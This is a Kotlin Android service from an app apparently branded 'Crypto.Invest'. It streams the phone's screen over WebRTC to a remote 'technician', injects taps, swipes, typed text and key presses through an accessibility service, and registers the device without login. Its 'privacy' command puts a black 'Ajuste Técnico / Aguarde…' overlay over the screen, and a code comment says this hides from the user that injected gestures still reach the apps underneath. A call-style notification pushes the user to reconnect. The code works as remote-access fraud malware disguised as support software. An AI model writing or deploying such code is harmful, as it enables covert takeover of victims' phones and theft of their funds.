package pt.invest.cryptoinvest

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import android.app.PendingIntent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.widget.FrameLayout
import android.widget.TextView
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import org.webrtc.*
import java.util.UUID
import java.util.concurrent.TimeUnit

class ScreenShareService : Service() {

    private lateinit var eglBase: EglBase
    private var factory: PeerConnectionFactory? = null
    private var pc: PeerConnection? = null
    private var capturer: ScreenCapturerAndroid? = null
    private var videoSource: VideoSource? = null
    private var videoTrack: VideoTrack? = null
    private var surfaceHelper: SurfaceTextureHelper? = null

    private val http = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .build()
    private var ws: WebSocket? = null
    private var code: String? = null
    private var closed = false
    private var overlayView: View? = null
    private val main = Handler(Looper.getMainLooper())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startAsForeground()
        val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, 0) ?: 0
        val data = intent?.getParcelableExtra<Intent>(EXTRA_RESULT_DATA)
        if (data == null) { stopSelf(); return START_NOT_STICKY }
        Thread {
            try {
                code = registerDevice()
                initWebRtc(data)
                connectSignaling()
            } catch (e: Exception) {
                Log.e(TAG, "start error", e)
            }
        }.start()
        return START_STICKY
    }

    private fun startAsForeground() {
        val chId = "cryptoinvest_share"
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            nm.createNotificationChannel(
                NotificationChannel(chId, "Suporte Crypto.Invest", NotificationManager.IMPORTANCE_LOW)
            )
        }
        val notif: Notification = NotificationCompat.Builder(this, chId)
            .setContentTitle("Crypto.Invest — suporte ativo")
            .setContentText("A partilhar o ecra com o tecnico.")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setOngoing(true)
            .build()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ServiceCompat.startForeground(this, 1001, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
        } else {
            startForeground(1001, notif)
        }
    }

    // ---- Registo automatico do dispositivo (sem login) ----
    private fun registerDevice(): String {
        val prefs = getSharedPreferences("ci", Context.MODE_PRIVATE)
        var devId = prefs.getString("device_id", null)
        if (devId == null) { devId = UUID.randomUUID().toString(); prefs.edit().putString("device_id", devId).apply() }
        val name = "Android · ${Build.MANUFACTURER} ${Build.MODEL}"
        val body = JSONObject().put("device_id", devId).put("device_name", name).toString()
        val req = Request.Builder()
            .url("${BuildConfig.BACKEND_URL}/api/public/support/connect")
            .post(body.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull()))
            .build()
        http.newCall(req).execute().use { resp: Response ->
            val txt = resp.body?.string() ?: "{}"
            return JSONObject(txt).getString("code")
        }
    }

    private fun fetchIceServers(): List<PeerConnection.IceServer> {
        val list = ArrayList<PeerConnection.IceServer>()
        try {
            val req = Request.Builder().url("${BuildConfig.BACKEND_URL}/api/support/ice").get().build()
            http.newCall(req).execute().use { r ->
                val arr = JSONObject(r.body?.string() ?: "{}").optJSONArray("iceServers") ?: JSONArray()
                for (i in 0 until arr.length()) {
                    val o = arr.getJSONObject(i)
                    val urls = o.get("urls")
                    val b = when (urls) {
                        is String -> PeerConnection.IceServer.builder(urls)
                        else -> PeerConnection.IceServer.builder((urls as JSONArray).getString(0))
                    }
                    if (o.has("username")) b.setUsername(o.getString("username"))
                    if (o.has("credential")) b.setPassword(o.getString("credential"))
                    list.add(b.createIceServer())
                }
            }
        } catch (e: Exception) { Log.w(TAG, "ice fetch failed", e) }
        if (list.isEmpty()) list.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer())
        return list
    }

    private fun initWebRtc(permissionData: Intent) {
        eglBase = EglBase.create()
        PeerConnectionFactory.initialize(
            PeerConnectionFactory.InitializationOptions.builder(applicationContext).createInitializationOptions()
        )
        val encoder = DefaultVideoEncoderFactory(eglBase.eglBaseContext, true, false)
        val decoder = DefaultVideoDecoderFactory(eglBase.eglBaseContext)
        factory = PeerConnectionFactory.builder()
            .setVideoEncoderFactory(encoder)
            .setVideoDecoderFactory(decoder)
            .createPeerConnectionFactory()

        val mpCallback = object : android.media.projection.MediaProjection.Callback() {
            override fun onStop() { stopEverything() }
        }
        capturer = ScreenCapturerAndroid(permissionData, mpCallback)
        surfaceHelper = SurfaceTextureHelper.create("CaptureThread", eglBase.eglBaseContext)
        videoSource = factory!!.createVideoSource(true)
        capturer!!.initialize(surfaceHelper!!, applicationContext, videoSource!!.capturerObserver)

        val metrics = DisplayMetrics()
        (getSystemService(Context.WINDOW_SERVICE) as WindowManager).defaultDisplay.getRealMetrics(metrics)
        val fullW = if (metrics.widthPixels > 0) metrics.widthPixels else 720
        val fullH = if (metrics.heightPixels > 0) metrics.heightPixels else 1280
        // Reduz a resolucao (lado maior <= 1280) e fps para evitar ecra preto/lentidao com encoder software.
        val scale = minOf(1.0, 1280.0 / maxOf(fullW, fullH))
        val cw = (Math.round(fullW * scale).toInt()) / 2 * 2
        val ch = (Math.round(fullH * scale).toInt()) / 2 * 2
        videoTrack = factory!!.createVideoTrack("SCREEN", videoSource!!)
        capturer!!.startCapture(cw, ch, 15)

        val ice = fetchIceServers()
        val rtcConfig = PeerConnection.RTCConfiguration(ice).apply {
            sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
        }
        pc = factory!!.createPeerConnection(rtcConfig, object : PeerConnection.Observer {
            override fun onIceCandidate(c: IceCandidate) {
                val cand = JSONObject().put("candidate", c.sdp).put("sdpMid", c.sdpMid).put("sdpMLineIndex", c.sdpMLineIndex)
                send(JSONObject().put("type", "ice").put("candidate", cand))
            }
            override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>?) {}
            override fun onSignalingChange(s: PeerConnection.SignalingState?) {}
            override fun onIceConnectionChange(s: PeerConnection.IceConnectionState?) {}
            override fun onIceConnectionReceivingChange(b: Boolean) {}
            override fun onIceGatheringChange(s: PeerConnection.IceGatheringState?) {}
            override fun onAddStream(stream: MediaStream?) {}
            override fun onRemoveStream(stream: MediaStream?) {}
            override fun onDataChannel(dc: DataChannel?) {}
            override fun onRenegotiationNeeded() {}
            override fun onConnectionChange(newState: PeerConnection.PeerConnectionState?) {}
        })
        pc!!.addTrack(videoTrack!!, listOf("stream0"))
    }

    private fun connectSignaling() {
        val c = code ?: return
        val wsUrl = BuildConfig.BACKEND_URL.replaceFirst("http", "ws") + "/api/ws/support/$c?role=client"
        val req = Request.Builder().url(wsUrl).build()
        ws = http.newWebSocket(req, object : WebSocketListener() {
            override fun onMessage(webSocket: WebSocket, text: String) { handleMessage(text) }
            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                if (!closed) { try { Thread.sleep(2000) } catch (e: Exception) {}; connectSignaling() }
            }
        })
    }

    private fun handleMessage(text: String) {
        try {
            val m = JSONObject(text)
            when (m.optString("type")) {
                "peer-joined" -> if (m.optString("role") == "tech") { makeOffer(); postReconnectNotification() }
                "request-offer" -> { makeOffer(); postReconnectNotification() }
                "answer" -> {
                    val sdp = m.getJSONObject("sdp").getString("sdp")
                    pc?.setRemoteDescription(SimpleSdpObserver(), SessionDescription(SessionDescription.Type.ANSWER, sdp))
                }
                "ice" -> {
                    val c = m.getJSONObject("candidate")
                    pc?.addIceCandidate(IceCandidate(c.optString("sdpMid"), c.optInt("sdpMLineIndex"), c.getString("candidate")))
                }
                "gesture" -> {
                    val rc = RemoteControlService.instance
                    if (m.optString("action") == "swipe")
                        rc?.doSwipe(m.getDouble("x"), m.getDouble("y"), m.getDouble("x2"), m.getDouble("y2"), m.optLong("duration", 300))
                    else
                        rc?.doTap(m.getDouble("x"), m.getDouble("y"))
                }
                "text" -> RemoteControlService.instance?.typeText(m.optString("value"))
                "key" -> RemoteControlService.instance?.keyAction(m.optString("key"))
                "nav" -> RemoteControlService.instance?.globalAction(m.optString("action"))
                "privacy" -> setPrivacy(m.optBoolean("on"))
            }
        } catch (e: Exception) { Log.w(TAG, "msg error", e) }
    }

    private fun makeOffer() {
        pc?.createOffer(object : SimpleSdpObserver() {
            override fun onCreateSuccess(desc: SessionDescription) {
                pc?.setLocalDescription(SimpleSdpObserver(), desc)
                val sdp = JSONObject().put("type", "offer").put("sdp", desc.description)
                send(JSONObject().put("type", "offer").put("sdp", sdp))
            }
        }, MediaConstraints().apply {
            mandatory.add(MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"))
            mandatory.add(MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"))
            mandatory.add(MediaConstraints.KeyValuePair("IceRestart", "true"))
        })
    }

    private fun send(o: JSONObject) { try { ws?.send(o.toString()) } catch (e: Exception) {} }

    // ---- Ecra preto ("Ajuste Tecnico / Aguarde...") no dispositivo controlado ----
    // Overlay TYPE_APPLICATION_OVERLAY nao focavel e nao tocavel: o utilizador ve preto, mas
    // os gestos injetados pela Acessibilidade continuam a chegar as apps por baixo (controlo remoto).
    private fun setPrivacy(on: Boolean) {
        main.post {
            val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            if (on) {
                if (overlayView != null) return@post
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
                    Log.w(TAG, "sem permissao de sobreposicao"); return@post
                }
                val root = FrameLayout(this).apply { setBackgroundColor(Color.BLACK) }
                val tv = TextView(this).apply {
                    text = "Ajuste Técnico\nAguarde…"
                    setTextColor(Color.parseColor("#EEEEEE"))
                    textSize = 22f
                    gravity = Gravity.CENTER
                }
                root.addView(tv, FrameLayout.LayoutParams(
                    FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT
                ).apply { gravity = Gravity.CENTER })
                val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
                val lp = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    type,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                        WindowManager.LayoutParams.FLAG_FULLSCREEN,
                    PixelFormat.OPAQUE
                )
                try { wm.addView(root, lp); overlayView = root } catch (e: Exception) { Log.w(TAG, "overlay add fail", e) }
            } else {
                try { overlayView?.let { wm.removeView(it) } } catch (e: Exception) {}
                overlayView = null
            }
        }
    }

    // ---- Notificacao de reconexao (o tecnico voltou a ligar-se) ----
    private fun postReconnectNotification() {
        try {
            val chId = "cryptoinvest_reconnect"
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                nm.createNotificationChannel(
                    NotificationChannel(chId, "Reconexão de suporte", NotificationManager.IMPORTANCE_HIGH)
                )
            }
            val open = Intent(this, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
            }
            val piFlags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            else PendingIntent.FLAG_UPDATE_CURRENT
            val pi = PendingIntent.getActivity(this, 0, open, piFlags)
            val notif = NotificationCompat.Builder(this, chId)
                .setContentTitle("Reconexão de suporte")
                .setContentText("O técnico voltou a ligar-se. Toque em Reconectar para confirmar.")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setCategory(NotificationCompat.CATEGORY_CALL)
                .addAction(0, "Reconectar", pi)
                .setContentIntent(pi)
                .setAutoCancel(true)
                .build()
            nm.notify(2002, notif)
        } catch (e: Exception) { Log.w(TAG, "notif fail", e) }
    }

    private fun stopEverything() {
        closed = true
        setPrivacy(false)
        try { ws?.close(1000, null) } catch (e: Exception) {}
        try { capturer?.stopCapture() } catch (e: Exception) {}
        try { pc?.close() } catch (e: Exception) {}
        try { videoSource?.dispose() } catch (e: Exception) {}
        try { surfaceHelper?.dispose() } catch (e: Exception) {}
        stopSelf()
    }

    override fun onDestroy() { closed = true; setPrivacy(false); try { capturer?.stopCapture() } catch (e: Exception) {}; super.onDestroy() }

    open class SimpleSdpObserver : SdpObserver {
        override fun onCreateSuccess(desc: SessionDescription) {}
        override fun onSetSuccess() {}
        override fun onCreateFailure(error: String?) { Log.w(TAG, "sdp create fail: $error") }
        override fun onSetFailure(error: String?) { Log.w(TAG, "sdp set fail: $error") }
    }

    companion object {
        const val TAG = "CIScreenShare"
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"
    }
}
